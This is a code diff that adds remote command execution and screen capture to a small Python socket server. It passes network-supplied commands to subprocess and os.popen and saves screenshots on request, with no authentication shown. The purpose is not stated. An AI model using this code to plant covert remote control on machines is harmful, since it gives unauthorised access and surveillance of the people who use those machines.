@@ -4,6 +4,8 @@ import time
 import socket
 import urllib.request
 import _thread
+import subprocess
+from PIL import ImageGrab
 
 
 def alive():
@@ -29,6 +31,27 @@ def client(clientsocket, addr):
         elif cmd[0] == 'os.system':
             res = os.system(cmd[1])
             print(res)
+            response = "finish"
+            clientsocket.send(bytes(response, "utf-8"))
+            clientsocket.close()
+        elif cmd[0] == 'subprocess':
+            rc, out= subprocess.getstatusoutput(cmd[1])
+            print(rc)
+            print(out)
+            response = "finish"
+            clientsocket.send(bytes(response, "utf-8"))
+            clientsocket.close()
+        elif cmd[0] == 'os.popen':
+            f = os.popen(cmd[1])
+            data = f.readlines()
+            f.close() 
+            print(data)
+            response = "finish"
+            clientsocket.send(bytes(response, "utf-8"))
+            clientsocket.close()
+        elif cmd[0] == 'grab':
+            im = ImageGrab.grab(bbox=(0,0,1366,768))
+            im.save('screen.png')
             response = "finish"
             clientsocket.send(bytes(response, "utf-8"))
             clientsocket.close()
